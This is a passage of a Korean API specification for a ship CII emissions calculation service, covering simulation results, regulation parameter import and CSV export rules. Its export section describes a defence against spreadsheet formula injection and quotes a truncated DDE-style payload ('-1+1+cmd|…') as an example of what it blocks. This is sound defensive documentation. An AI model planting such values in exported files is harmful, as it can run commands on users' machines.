  "parameter_hash": "sha256:...",
  "warnings": [
    "REFERENCE_ONLY"
  ],
  "disclaimer": "참고용 예측값입니다. 규제 제출용 공식 결과가 아닙니다.",
  "meta": {
    "request_id": "uuid",
    "timestamp": "2026-07-03T12:00:00Z",
    "duration_ms": 2840,
    "as_of": "2026-08-01T00:00:00+00:00"
  }
}
```

> **[#816] `meta.as_of` — 집계에 실제로 쓴 기준 시각** (`TECH_SPEC §5.4.1` 계약 ⑵). 명시 실행은 그 값, 미명시 실행은 서버가 확정한 시각(스냅숏 생성 시각과 같은 뜻)이 실린다. `§6.2` 조회·`§6.4` 재현도 같은 규칙으로 같은 값을 낸다 — 같은 실행의 기준 시각이 경로마다 갈라 보이지 않는다.

> **[#816 ⑶] `parameters_used`는 v2다** (2026-09-18 결정). v1 블록(`regulation_year`·`reference_line`·`rating_boundary`·`simulation_profile`)에 세 가지가 더해진다:
>
> | 필드 | 뜻 |
> |---|---|
> | `fuel_types` | 계획 항차에 곱한 **활성 CF** (`#832`). `[{code, cf}]` — 이 실행이 실제로 쓴 유종만. CF 개정이 `parameter_hash`에 드러나지 않으면 재현성 계약이 성립하지 않는다 |
> | `parameter_sources` | 출처 4키 — `regulation_year`·`reference_line`·`rating_boundary`는 각자의 `source_ref`, `fuel_types`는 `[{code, source_ref}]` (유종별 출처). 종전 `parameter_source_version`은 기준선 하나만 담었다 |
> | `parameter_schema_version` | `2`. **필드가 없는 저장 행은 v1** — 재현은 저장된 버전의 빌더로 다시 만들어 v1 실행의 해시를 그대로 재생한다 |
>
> 스키마의 정본은 **`TECH_SPEC §5.2.1.2`**다(v1·v2 블록 대조 · 판정 규칙 · `rating_boundary.ship_type`을 싣는 이유) — 이 표는 응답에서 보이는 차이만 요약한다 (#1306).

> **[#756] 거리 두 행이 기준값(`5.02`)과 같은 것은 오기가 아니다.** 거리 ±5%는 연료를 같은 비율로 함께 움직이므로, **잔여 계획의 배출 강도가 확정 실적과 같으면 CII가 정확히 변하지 않는다**(`PRD §12.6` 각주 — 혼합비와 무관하다). 예시는 그 경우다. ⚠️ **항상 같은 값이 나오는 것은 아니다** — 실적이 계획에서 벌어져 두 구간의 강도가 달라지면 이 행도 움직인다. 종전 예시는 `4.96`·`5.08`로 **구현이 낼 수 없는 변화**를 싣고 있었다.
>
> **[#756 ⑴ · 2026-09-17 결정 「나」] `fuel_cf_alternative` — 질량 유지 대체 연료.** 요청이 `alternative_fuel`을 고른 실행에만 이 블록이 나간다(미지정이면 키 자체가 없다 — 「효과 없음」이 아니라 「계산하지 않았다」다). 잔여 계획 전체의 CF를 그 연료의 활성 값으로 교체해 연말 값을 다시 내며, **연료량은 그대로** 둔다. 확정 실적의 CF는 바꾸지 않는다(이미 그 계수로 배출했다).
>
> | 필드 | 뜻 |
> |---|---|
> | `alternative_fuel` | 요청이 고른 연료 코드 |
> | `alternative_cf` | 적용한 CF (`MEPC.364(79)` 표의 활성 값) |
> | `projected_cii` | 대체 후 연말 CII (결정론) |
> | `co2_change` | **연말 총 CO₂**의 변화율 — 확정분은 그대로이므로 잔여 비중에 따라 폭이 작아진다 |
> | `rating_change` | `기준→대체` 등급 변화 |
>
> ⚠️ **질량 기준임을 경고로 알린다** — `FUEL_CF_MASS_BASIS`(`§1.6`). 문구는 `PRD §6.3`이 확정했다: 「연료량을 그대로 두고 배출계수만 바꿔 계산했습니다. 발열량 차이에 따른 연료량 변화는 반영되지 않았습니다.」 발열량 기준은 LCV의 IMO 원문 대조 뒤 같은 자리에 더해진다(#773 연계).

> **스냅샷 격리** (TECH_SPEC §11): 시뮬레이션 시작 시점의 모든 항차 데이터를 스냅샷으로 복사한다. 시뮬레이션 실행 중 발생하는 상태 변경은 진행 중인 시뮬레이션에 영향을 주지 않는다.


#### 6.1.1 `reduction_plan` — 필요 감축량 (목표 역산) [#433]

`PRD §12.3.1`을 그대로 낸다. **`§12.4` Monte Carlo를 호출하지 않는다**(`UIFLOW 2-10`) — 같은 실행의 `deterministic` 네 값에서 파생되므로, 확률 결과와 **전제가 갈릴 수 없다**.

| 필드 | 뜻 |
|---|---|
| `target_rating` | 요청의 `target_rating`을 그대로 돌려준다. A~D(`§12.8`이 E를 거부) |
| `target_cii` | 목표 등급의 경계값(`PRD §3.3.6`). 이 값 **이하**여야 그 등급이다 |
| `allowed_planned_M_gco2` | 잔여 계획에서 배출해도 되는 CO₂ 상한. **음수일 수 있다** — 확정 실적만으로 이미 넘겼다는 뜻 |
| `required_cut_gco2` | 줄여야 하는 CO₂ 질량. **`0`이면 이미 목표를 넘고 있다** |
| `required_cut_fuel_ton` | 위를 연료 톤으로 환산(`§12.2` 잔여 계획 연료 구성비 유지). **잔여 계획이 없으면 `null`** — 줄일 대상이 없는 것과 줄일 것이 없는 것은 다르다 |
| `achievable` | `false`면 **잔여 계획을 전부 없애도** 목표에 닿지 못한다. 이때 「n톤 줄이세요」는 거짓이 되므로 화면이 다르게 말해야 한다 |

> ⚠️ **`#433` 이전에 만들어진 실행에는 이 블록이 없다.** `§6.2` 조회는 저장된 본문을 그대로 돌려주므로 그 실행에서는 필드가 빠진다 — 지금 계산해 채우면 그것은 조회가 아니라 재실행이다(`#443`과 같은 이유). 화면이 부재를 다룬다.

#### 6.1.2 `feedback` — 실적 보정계수 [#363]

`PRD §12.2.1`을 그대로 낸다. **요청에서 켜지 않아도 늘 싣는다** — 켜기 전에 「이 배는 계획보다 얼마나 더 쓰는가」를 볼 수 있어야 한다.

| 필드 | 뜻 |
|---|---|
| `factor` | 확정 항차의 연료 강도 비(실적 ÷ 계획). **표본이 `min_sample`보다 적으면 `null`** — `1`로 채우지 않는다(「계획대로 쓰고 있다」와 구분되지 않는다) |
| `sample_size` | 계획·실적 연료와 거리가 모두 양수인 확정 항차 수 |
| `min_sample` | 계수를 내는 데 필요한 최소 항차 수. 현재 `3` |
| `requested` | 요청의 `apply_feedback_factor` |
| `applied` | 실제로 곱했는가. **켰어도 `factor`가 `null`이면 `false`이고 `warnings`에 `FEEDBACK_FACTOR_UNAVAILABLE`** |

> **재현(`§6.4`)** — 계수는 저장하지 않는다. 켰는지(`annual_simulation_run.apply_feedback_factor`)만 남기고, 재현은 **같은 스냅샷에서 계수를 다시 낸다.** 켠 사실은 `input_hash` 재료에 켰을 때만 들어가 끈 실행의 해시는 이 필드가 생기기 전과 같다.
>
> ⚠️ **`#363` 이전에 만들어진 실행에는 이 블록이 없다** — `§6.1.1`과 같은 이유다.

### 6.2 연간 시뮬레이션 결과 조회

```http
GET /api/v1/annual-simulations/{simulation_run_id}
```

#### 응답 (200 OK)

§6.1의 응답과 동일. `calculation_run_id`로 저장된 결과를 재조회한다.

### 6.3 스냅샷 항차 상세 조회

> **[ORACLE-S-7 추가]**

```http
GET /api/v1/annual-simulations/{simulation_run_id}/snapshot-voyages
```

시뮬레이션 시작 시점의 스냅샷에 포함된 항차 데이터를 조회한다.

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "snapshot_voyage_id": "uuid",
      "original_voyage_id": "uuid",
      "voyage_no": "V-2026-001",
      "status_at_snapshot": "CONFIRMED",
      "distance_nm": 11200.0,
      "speed_kn": 13.5,
      "fuel_uses": [
        { "fuel_type": "HFO", "fuel_ton": 850.0, "cf_used": 3.114 }
      ],
      "annual_inclusion_policy": "INCLUDE_AS_ACTUAL"
    }
  ],
  "meta": { ... }
}
```

> **[#1337] `distance_nm`·`fuel_uses[].fuel_ton`은 「그 실행의 계산이 실제로 쓴 값」이다 — 어느 벌을 쓰는지는 행의 `annual_inclusion_policy`가 정한다.** 스냅샷(`DB_SCHEMA §2.7` `voyages_json`)에는 계획·실적 두 벌이 다 남지만 이 응답은 한 벌만 싣고, 고르는 규칙은 계산(`TECH_SPEC §11.4`)과 행 종류별로 같다.
>
> | `annual_inclusion_policy` | 싣는 값 |
> |---|---|
> | `INCLUDE_AS_ACTUAL` | 실적이 있으면 실적, 없으면 계획(`PRD §8.3` · `COMPLETED_NO_FUEL` 임시 대입과 같은 규칙) |
> | `INCLUDE_AS_PLAN` | **계획값만.** `IN_PROGRESS` 항차는 실적 일부를 이미 갖고 있을 수 있는데(`§3.6`), 계산은 그 값을 쓰지 않으므로 여기에도 싣지 않는다 |
>
> 종전 구현은 모든 행에 첫 규칙을 적용해, 항해 중 실적 일부를 넣은 진행 항차가 **계산에 쓰지 않은 값**으로 「이 실행에 쓴 항차」에 나갔다(실측 — 계산 3000 nm·100 t, 화면 1200 nm·40 t). 재현성의 근거 화면(`PRD §12` · `#992`)이 거짓 근거가 되는 자리라 응답을 계산의 분기에 맞췄다. 계획값이 없어 계산에서 빠진 항차(`SIMULATION_PLAN_NO_FUEL`)는 이 목록에 **계획값 그대로(0)** 나오고 빠졌다는 사실은 `§6.1` `warnings`가 말한다 — 이 목록만 보고 「썼다/안 썼다」를 세지 않는다.

### 6.4 동일 seed로 재실행

```http
POST /api/v1/annual-simulations/{simulation_run_id}/reproduce
```

동일 vessel_id, regulation_year, random_seed, simulation_runs, distribution_profile로 재실행한다.

#### 응답 (200 OK)

§6.1의 응답과 동일. 결과는 동일해야 한다 (재현성 보장).

> **[#833] `model_version`도 판정 조건이다.** `TECH_SPEC §5.4` 1항의 세 조건(`input_hash` · `parameter_hash` · `model_version`)을 전부 본다. 원본과 다른 환경(NumPy·엔진·정밀도 — `TECH_SPEC §10.1`)에서 돌렸는데 결과가 같으면 **200 + `warnings`에 `MODEL_VERSION_DIFFERS`**, 결과가 다르면 **409 `MODEL_VERSION_MISMATCH`**(500이 아니다 — 약속 밖의 변화라 계산 결함이 아니다). 응답의 `model_version`은 여전히 **원본이 돌았던 환경**이다. 판정 표는 `TECH_SPEC §10.3`.

#### 오류

> **[ORACLE-S-4 추가]**

| Status | Code | 조건 |
|---|---|---|
| 409 Conflict | `PARAMETER_ERROR` | 원본 실행 이후 규정 파라미터가 변경됨. `parameter_hash` 불일치. |
| 409 Conflict | `MODEL_VERSION_MISMATCH` | 원본과 다른 `model_version`에서 재현했고 **결과도 다름**. `details[]`에 달라진 필드(`field` · `stored` · `current`). 새 환경에서 새로 실행한다 (#833) |
| 500 Internal Server Error | `REPRODUCIBILITY_ERROR` | 재현 결과의 `input_hash` 또는 Monte Carlo 결과가 원본과 불일치. canonical test vector 실패 가능. |
| 422 | `CALCULATION_ERROR` | 스냅샷에 **거리가 없다** — `§6.1`과 같은 코드·같은 문구다(`#1084`). 실행 단계에서 이미 422로 막히므로 저장된 실행으로는 여기에 닿지 않지만, **두 경로가 같은 상태를 다르게 설명하지 않도록** 배선을 한 곳에 두었다 |

---

## 7. Parameter API

### 7.1 규정 연도 조회

```http
GET /api/v1/parameters/regulation-years?active=true
```

**쿼리 파라미터** (`#1515`)

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `active` | bool | N | 기본 `true` — **현행(활성) 행만**, 종전 응답과 같다. `false`면 개정으로 대체된 **이행 행까지 전부** 돌려준다(현행 행도 함께 온다). 각 행의 `is_active`가 어느 쪽인지 말한다 |

> ⚠️ **`§7.2` 연료의 `active=false`와 뜻이 다르다.** 연료는 「비활성만」이고 여기(연도·기준선·경계)는 「전부」다 — 이 세 조회의 용도가 **옛 판본을 현행과 나란히 놓고 비교**하는 것이기 때문이다(`PRD §8.4` 개정 다음 날의 화면). 연료 쪽 계약은 `#444`부터 있던 것이라 바꾸지 않는다.

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "year": 2026,
      "z_factor_percent": "11.0",
      "effective_from": "2026-01-01",
      "source_ref": "MEPC.400(83)",
      "version": "2024-q1",
      "is_active": true,
      "created_at": "2026-09-18T02:14:07+00:00"
    }
  ],
  "meta": { ... }
}
```

**판본 세 필드** — `§7.1`·`§7.3`·`§7.4`가 똑같이 싣는다 (`#1515`)

| 필드 | 타입 | 뜻 |
|---|---|---|
| `version` | string | 판본 라벨. 시드는 `1.0`, `§7.5` 적재분은 `import.<UTC 시각>` |
| `is_active` | bool | 현행이면 `true`. `active=true`(기본) 조회에서는 항상 `true`다 |
| `created_at` | ISO 8601 | 행이 들어온 시각(`created_at` 컬럼). 파라미터 테이블에는 `updated_at`이 없다 — 개정은 행을 고치지 않고 새 행을 넣는다(`DB_SCHEMA §7.2`) |

### 7.2 연료 종류 조회

```http
GET /api/v1/parameters/fuel-types?active=true
```

> **연료에는 판본 이력이 없다** (`#1515`). `fuel_type`은 `DB_SCHEMA §7.2`의 명시적 예외로 CF 개정을 **제자리에서 갱신**한다(`§7.5` 「개정의 반영 방식」) — 그래서 이 응답에 `version`·`created_at`을 싣지 않고, `?active=false`는 「이전 판본」이 아니라 **「비활성 연료만」**을 뜻한다. 개정 이력이 필요하면 `§16.1` 감사 로그(`PARAMETER_IMPORT` · `details.source_refs`)가 그 답이다.

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "code": "HFO",
      "display_name": "Heavy Fuel Oil",
      "cf": "3.114",
      "unit": "tCO₂/tFuel",
      "source_ref": "MEPC.364(79)",
      "is_active": true
    }
  ],
  "meta": { ... }
}
```

### 7.3 선종별 Reference Line 조회

```http
GET /api/v1/parameters/reference-lines?ship_type=BULK_CARRIER&active=true
```

**쿼리 파라미터**

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `ship_type` | string | N | 선종 필터. 생략하면 전 선종. 모르는 선종은 빈 배열이 아니라 **422** |
| `active` | bool | N | `§7.1`과 같다 — 기본 `true`(현행만), `false`면 이행 행까지 전부 (`#1515`) |

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "ship_type": "BULK_CARRIER",
      "condition_expr": "DWT >= 279000",
      "capacity_rule": "fixed 279000",
      "a_raw": "4745",
      "a_decimal": "4745",
      "c": "0.622",
      "source_ref": "MEPC.353(78)",
      "version": "1.0",
      "is_active": true,
      "created_at": "2026-09-18T02:14:07+00:00"
    },
    {
      "ship_type": "BULK_CARRIER",
      "condition_expr": "DWT < 279000",
      "capacity_rule": "DWT",
      "a_raw": "4745",
      "a_decimal": "4745",
      "c": "0.622",
      "source_ref": "MEPC.353(78)",
      "version": "1.0",
      "is_active": true,
      "created_at": "2026-09-18T02:14:07+00:00"
    }
  ],
  "meta": { ... }
}
```

`version`·`is_active`·`created_at`은 `§7.1`의 판본 세 필드다. `active=false`로 받으면 같은 `ship_type`·`condition_expr`의 행이 판본마다 하나씩 온다 — 정렬은 선종 · 조건식 · **적재 시각** 순이라 이행 행이 현행 행 앞에 선다.

### 7.4 등급 경계 조회

```http
GET /api/v1/parameters/rating-boundaries?ship_type=BULK_CARRIER&active=true
```

**쿼리 파라미터** — `§7.3`과 같다 (`ship_type` · `active`).

#### 응답 (200 OK)

```json
{
  "data": [
    {
      "ship_type": "BULK_CARRIER",
      "condition_expr": "all",
      "capacity_basis": "DWT",
      "d1": "0.86",
      "d2": "0.94",
      "d3": "1.06",
      "d4": "1.18",
      "source_ref": "MEPC.354(78)",
      "version": "1.0",
      "is_active": true,
      "created_at": "2026-09-18T02:14:07+00:00"
    }
  ],
  "meta": { ... }
}
```

`version`·`is_active`·`created_at`은 `§7.1`의 판본 세 필드다.

> 🔴 **계산은 `active`와 무관하게 언제나 활성 행만 본다.** `?active=false`는 `§7.1`·`§7.3`·`§7.4` **조회 응답**에만 있는 스위치이고, 항차 CII·YTD·시나리오 비교가 부르는 저장소 갈래에는 이 인자가 없다 — 대체된 기준선으로 등급이 나오면 `TECH_SPEC §5.4` 재현성 계약이 깨진다. `tests/test_parameters_api_db.py`가 소스를 훑어 잠근다 (`#1515`).

### 7.5 파라미터 Import

> **구현됐다 (#673 · 결정요청 v9 회신 「가」 · 2026-09-18).** CSV 형식·사무직 전용·적재 감사
> 로그·`OTHER` 연료 생성 경로 포함. 종전 명세(JSON 요청 본문)는 그 형식을 버리고 항차·정박
> CSV와 **같은 조작**으로 통일했다 — 사용자가 두 번 배우지 않게.

```http
POST /api/v1/parameters/import
```

**사무직 전용**이다(`§1.2` 역할 표 · `require_office`). 규정 개정 적재는 등급 판정 기준
자체를 바꾸는 조작이므로 **적재가 감사 로그(`PARAMETER_IMPORT`)에 남는다** — 누가·언제·
무엇을·몇 행. 과거 계산은 각자 스냅숏을 가지므로 보존되고(`PRD §8.4`), 재현은 활성 CF를
다시 읽어 `parameter_hash`가 갈리면 409로 끊는다(#816 ⑶ — 개정이 드러나는 것이 계약대로다).

#### 요청 (multipart/form-data)

| 필드 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `file` | file | Y | CSV 파일 (UTF-8, BOM 허용 · 최대 5MB · 1,000행 — `§8.2` 보안 표와 같은 값) |
| `type` | string | Y | `regulation_years` · `reference_lines` · `rating_boundaries` · `fuel_types`. 모르는 값은 422 |

**쿼리 파라미터**

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `dry_run` | bool | N | 기본 `false`. `true`면 **검증만 하고 저장하지 않는다** — `imported_count`는 「들어갈 수 있는 행 수」다 |

#### 🔴 전부 아니면 전무 — `§8.2`와 정반대 계약

항차·정박 CSV(`§8.2`)는 **부분 성공**이지만, 규정 파라미터는 **한 행이라도 걸리면 아무것도
들어가지 않는다** — 일부만 들어가면 계산 근거가 반쪽이 되기 때문이다(`TEST_PLAN §3.5`
`IT-IMPORT-005`). `errors[]`의 모양(원본 행 번호·필드·사유)과 `dry_run`이 실제 적재와 같은
판정을 내는 규약(#1190)만 `§8.2`에서 온다.

#### `type`별 필수 컬럼

| type | 컬럼 | 비고 |
|---|---|---|
| `regulation_years` | `year` · `z_factor_percent` · `effective_from` · `source_ref` | 연도는 2019~2050. Z-factor ≥ 0 |
| `reference_lines` | `ship_type` · `condition_expr` · `capacity_rule` · `a_raw` · `c` · `source_ref` | `a_decimal`은 서버가 `parse_imo_scientific`으로 계산한다(`TECH_SPEC §9.2` — 올리지 않는다). `capacity_rule`은 `DWT`·`GT`·`fixed <숫자>` |
| `rating_boundaries` | `ship_type` · `condition_expr` · `capacity_basis` · `d1`~`d4` · `source_ref` | `d1 < d2 < d3 < d4` |
| `fuel_types` | `code` · `display_name` · `cf` · `source_ref` | 선택 `effective_from` — **`OTHER` 생성에만 필수**(`PRD §3.4.2`) |

행 검증은 저장 컬럼의 한도(길이·`NUMERIC(p,s)` 자릿수)까지 본다(#1190와 같은 계약 — 값
때문에 저장 단계에서 죽는 행이 `dry_run`을 통과하지 않는다). 수식 주입 방어도 `§8.2`와
같다. 모르는 선종·파일 안 키 중복·자릿수 초과는 모두 `{row, field, message}` 행 오류다.

#### 개정의 반영 방식 (`DB_SCHEMA §7.2`)

- 세 테이블(연도·기준선·경계) — 기존 **활성 행을 끄고**(`is_active = 0`, 이행 행으로
  보존) 새 행을 넣는다. 계산은 활성 행만 보고, 조회 API도 기본은 같다 — 이행 행은
  `?active=false`로만 온다(`§7.1` · `#1515`)
- `fuel_type` — §7.2의 명시적 예외. CF를 **제자리에서 갱신**하고 `content_hash`를 다시
  계산한다. `OTHER`를 비롯한 새 코드는 새 행으로 만든다 — 이 경로가 연료를 만드는 유일한
  쓰기 경로다

#### 응답 (200 OK)

```json
{
  "data": {
    "table": "regulation_years",
    "imported_count": 1,
    "replaced_count": 1,
    "errors": [],
    "dry_run": false
  },
  "meta": { ... }
}
```

| 필드 | 뜻 |
|---|---|
| `imported_count` | **적용된 행 수** (연료 갱신도 포함 — 신규만 세면 「안 들어갔다」로 읽힌다) |
| `replaced_count` | 그중 기존 활성 행(연료는 기존 행)을 대체·갱신한 수 |
| `errors[]` | `{row, field, message}` — 원본 파일의 행 번호다. **하나라도 있으면 아무것도 들어가지 않았다** |

#### 감사 로그 `details` (`PARAMETER_IMPORT`)

적재가 성공하면 `audit_log`에 한 행이 남고(`§16.1`로 읽는다), `details`는 다음과 같다. `dry_run`은 남지 않는다 — 적재가 일어나지 않았다.

```json
{
  "imported_count": 3,
  "replaced_count": 1,
  "version": "import.20260921T031500Z",
  "dry_run": false,
  "source_refs": ["MEPC.400(83) amendment", "MEPC.999(99) draft"]
}
```

| 필드 | 뜻 |
|---|---|
| `imported_count` · `replaced_count` | 응답과 같은 값 |
| `version` | 이 배치가 새 행에 찍은 판본 라벨 — `§7.1` 응답의 `version`과 이어진다 |
| `source_refs` | 적재한 행들의 `source_ref` **고유 목록, 정렬** (`#1515`). 행 수·판본만으로는 「무엇을 근거로 바뀌었나」에 답할 수 없어 함께 남긴다. 연료는 판본 이력이 없으므로(`§7.2`) **이 목록이 연료 CF 개정의 유일한 출처 기록**이다 |

---

## 8. Data Import/Export API

### 8.1 CSV 내보내기

```http
GET /api/v1/vessels/{vessel_id}/export?type=voyages&year=2026&format=csv
```

⚠️ **vessel-scoped다** — `/api/v1/voyages/export`가 아니다. 가져오기(`§8.2`)와 같은 이유로 선박을 경로가 정한다: 자료에 선박 식별자를 실어도 경로와 다르면 무엇을 따를지 정해야 하고, 경로 하나로 두면 그 물음이 생기지 않는다.

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `type` | string | Y | `voyages`, `calculations`, `simulations` |
| `year` | int | N | 기준연도 필터 |
| `format` | string | N | `csv` (기본), `json` |
| `calculation_run_id` | uuid | N | **[#891]** `type=calculations`에서 **계산 한 건**만. 기능①의 「CSV 다운로드」(`PRD §10.5`)가 쓴다. 다른 `type`과 함께 오면 422(조용히 무시하면 한 건을 받으려다 전체 파일을 받는다) · 이 선박의 계산이 아니면 404. 파일 이름은 `calculations_{id 앞 8자}.csv` |

> **`type`에 기본값을 두지 않는다.** 기본값이 있으면 오타(`voyage`)가 조용히 `voyages`로 처리되어, 사용자는 계산 이력을 받으려다 항차 파일을 받고도 알아채지 못한다.

> **`year`의 뜻이 `type`마다 다르다.**
>
> | type | 거르는 값 |
> |---|---|
> | `voyages` | `voyage.regulation_year` |
> | `simulations` | `annual_simulation_run.regulation_year` |
> | `calculations` | **`created_at`의 연도 (KST)** — `calculation_run`에 규제연도 열이 없다 (`DB_SCHEMA §2.5`). 「그 해에 만든 계산」이지 「그 해를 대상으로 한 계산」이 아니다 |

#### 응답 (200 OK · `format=csv`)

```http
Content-Type: text/csv; charset=utf-8
Content-Disposition: attachment; filename="voyages_2026.csv"; filename*=UTF-8''voyages_2026.csv
```

UTF-8 **BOM**으로 시작하고 줄바꿈은 **CRLF**다(RFC 4180 §2). BOM이 없으면 한국어 Windows Excel이 CP949로 읽어 한글이 전부 깨진다. `Content-Disposition`은 ASCII `filename`과 UTF-8 `filename*`을 **둘 다** 보낸다(RFC 6266 §4.3) — `§8.3`과 같은 규칙이다.

**사용자 입력을 반출하는 셀과 라벨**(머리글 · `voyage_no` · 항만명 · `notes` · `fuel_type` · 상태·정책 코드 · 등급 · `warnings`·`model_version` 등)에 `§8.2`와 **같은** 수식 주입 방어를 적용한다(`=`·`+`·`-`·`@`·`\t`·`\r`로 시작하면 `'` 접두). 가져오기가 이미 막지만 **그 경로로만 값이 들어오는 것이 아니다** — 수기 등록·시드·직접 INSERT가 있다.

**수치 열은 렌더러가 숫자로 직렬화한다** [#1247] — 서버가 `Decimal`·정수에서 만든 값(거리·속력·연료 · `cf_used` · `co2_ton` · `regulation_year` · `duration_ms` · 계산·시뮬레이션의 값 열·건수)은 `'` 접두 없이 나가므로, 음수(`-12.5`)도 스프레드시트가 **숫자로** 읽는다.

> **수치 열인지는 열 선언으로만 정한다.** 어느 열이 수치인지는 표를 만드는 서비스가 **열 이름으로 선언**하고(`services/data_export.py` `NUMERIC_COLUMNS`), 렌더러는 그 선언만 본다. **값의 모양을 보고 「숫자 같으니 접두를 뺀다」고 판정하지 않는다** — 그 판정기가 곧 새 취약점이다(`-1+1+cmd|…`를 통과시키는 모양이 하나만 있어도 뚫린다). 같은 `-12.5`가 `voyage_no`에 있으면 종전대로 `'-12.5`다. 선언된 수치 열의 값이 숫자 문법(부호 하나 · 정수부 · 소수부)에 맞지 않으면 **문자열 규칙으로 되돌아간다** — 선언을 잘못 붙여도 원문이 그대로 나가는 일은 없고, 파일 생성이 막히지도 않는다(빈 칸은 접두 대상이 아니라 그대로 빈 칸이다).
>
> 종전 규정은 「모든 셀」이었다. 지금 열들은 CHECK 제약상 음수가 없어(`DB_SCHEMA` `chk_distance_positive` 등) 드러나지 않았지만, 증감 열이 생기는 순간 그 열 전체가 `'-12.5` **문자열**이 됐을 것이다. 규칙은 `§8.5`(리포트 CSV)와 같다.

#### `type=voyages` 컬럼 (23열)

**앞의 일곱 열이 `§8.2` 필수 컬럼 7종과 이름·순서가 같다** — 내보낸 파일을 그대로 다시 가져올 수 있다(왕복). 뒤에 붙는 열은 가져오기가 읽지 않으므로 무시된다.

| # | 컬럼 | 설명 |
|---|---|---|
| 1 | `voyage_id` | UUID. 아래 ⚠️의 행 분할을 식별한다 |
| 2~8 | `voyage_no` · `departure_port_name` · `arrival_port_name` · `planned_distance_nm` · `planned_speed_kn` · `fuel_type` · `planned_fuel_ton` | **`§8.2` 필수 컬럼 7종** (왕복 구간) |
| 9~12 | `status` · `regulation_year` · `annual_inclusion_policy` · `created_from` | 상태·집계 정책 |
| 13~18 | `actual_distance_nm` · `actual_avg_speed_kn` · `planned_departure_at` · `planned_arrival_at` · `actual_departure_at` · `actual_arrival_at` | 실적·시각 |
| 19~22 | `actual_fuel_ton` · `cf_used` · `co2_ton` · `notes` | 연료 실적·배출량·비고 |
| 23 | `planned_distance_source` | 계획 거리가 **어디서 왔나** (`§3.3` · `#1256`). `USER_INPUT` · `COORDINATE_ESTIMATE` · 빈 값(`null` = 「모른다」) |

```
voyage_id,voyage_no,departure_port_name,arrival_port_name,planned_distance_nm,planned_speed_kn,fuel_type,planned_fuel_ton,status,…
9e1c…,V-2026-001,Busan,Rotterdam,11200.00,13.50,HFO,850.0000,CONFIRMED,…
```

`co2_ton`은 **(실적 연료 ?? 계획 연료) × `cf_used`**다 — 항차 완료 리포트(`§8.3`)와 **같은 식**이며(`PRD §8.3` 실적 우선), 두 곳에 다른 식이 있으면 리포트와 파일의 CO₂가 갈린다.

> **[#1354] `planned_distance_source`를 맨 뒤에 붙인 이유.** 앞 일곱 열은 `§8.2` 가져오기 필수 컬럼과 **이름·순서가 같아야** 하므로(왕복) 중간에 넣을 수 없다. 이 열이 없는 동안 **내보낸 파일에서는 추정 거리와 직접 입력이 구분되지 않았다** — 화면은 구분해 보이는데(`PRD §15.2` 「좌표 기반 추정 거리」) 파일은 못 보이는 상태였다. 가져오기는 뒤 열을 읽지 않으므로 왕복 동작은 바뀌지 않는다.

> ⚠️ **한 행 = 항차 × 연료다.** 연료가 둘 이상인 항차는 행이 나뉘며 `voyage_id`가 같다. 그대로 다시 가져오면 가져오기가 1행을 1항차로 읽으므로 **같은 항차 번호로 여러 항차**가 만들어진다. 연료가 한 건도 없는 항차도 행을 남긴다(연료 칸이 빈다) — 빼면 파일의 항차 수가 화면과 달라진다.

> **`attained_cii`·`rating` 열은 두지 않는다** (`#59`). 채울 근거가 없다.
>
> 1. ~~`calculation_run.voyage_id`는 열은 있지만 **항상 NULL**이다~~ — **[#817] 항차를 밝힌 `§4.1` 계산은 이제 그 항차에 붙는다.** 그래도 그것은 「그 항차 조건의 가정 계산」이지 아래 2의 CII가 아니므로 이 근거가 사라져도 판단은 그대로다
> 2. 「항차 하나의 CII」는 **정본에 정의된 양이 아니다.** CII는 연간 집계량이고(`PRD §8.1.2`), 항차 완료 리포트조차 「연간 누적 CII」만 싣는다
>
> 열을 두고 비워 놓으면 「아직 계산 안 됨」으로 읽히지만 실제로는 **영원히 채워지지 않는 칸**이다. 항차별 CII가 필요해지면 먼저 ⑴ 계산-항차 연결과 ⑵ 그 양의 정의가 정본에 서야 한다.

#### `type=calculations` 컬럼 (17열)

`calculation_run_id` · `calculation_type` · `created_at` · `input_hash` · `parameter_hash` · `model_version` · `duration_ms` · `needs_recalc` · `attained_cii` · `required_cii` · `ratio_to_required` · `estimated_rating` · `co2_emission_ton` · `fuel_consumption_ton` · `distance_nm` · `risk_level` · `warnings`

저장된 `result_json`을 **다시 계산하지 않고 그대로** 읽는다 — 재계산하면 그 사이 파라미터가 바뀌었을 때 내보냈을 뿐인데 값이 달라진다(`§6.2`와 같은 이유).

> **시나리오 비교(`SCENARIO`) 실행은 값 칸이 빈다.** 결과가 여러 안이라 한 행에 담기지 않는다. 행을 빼면 이력이 파일에서 사라지므로 식별자·해시는 남기고 값만 비운다 — `calculation_type` 열이 그 이유를 말한다.

#### `type=simulations` 컬럼 (17열)

`simulation_run_id` · `calculation_run_id` · `created_at` · `regulation_year` · `target_rating` · `simulation_runs` · `snapshot_id` · `projected_attained_cii` · `projected_rating` · `risk_level` · `target_success_probability` · `p10` · `p50` · `p90` · `completed_voyage_count` · `remaining_voyage_count` · `warnings`

> **`#443` 이전 실행도 행을 남긴다.** 그 실행들은 `result_json`에 결과 본문이 없어 조회(`§6.2`)가 404로 끊지만, **내보내기는 끊지 않는다** — 한 행 때문에 파일 전체가 실패하면 사용자는 어느 행인지 알아낼 방법이 없다. 값 칸을 비우고 식별자는 남긴다.

#### 값의 표기

| 종류 | 표기 | 이유 |
|---|---|---|
| 없음 | **빈 칸** | `—`·`N/A`는 사람이 읽는 문서의 것이다. 자료 파일에 넣으면 숫자 열에 문자열이 섞여 다시 가져올 수 없다 |
| 수치 | 지수 표기 없음 (`10000.00`) · 음수는 `-12.5` 그대로(`'` 접두 없음 — 위 「수치 열」) | `1E+4`는 사람이 원본 값으로 알아보지 못한다. `'-12.5`는 스프레드시트가 문자열로 읽어 합계·정렬에서 빠진다 |
| 시각 | KST 오프셋을 단 ISO 8601 (`2026-02-10T16:00:00+09:00`) | 오프셋이 있어 기계가 정확히 읽고, 한국 사용자가 스프레드시트에서 자기 시각으로 본다. UTC ISO면 후자가, 오프셋 없는 현지 시각이면 전자가 깨진다 (`#646`) |
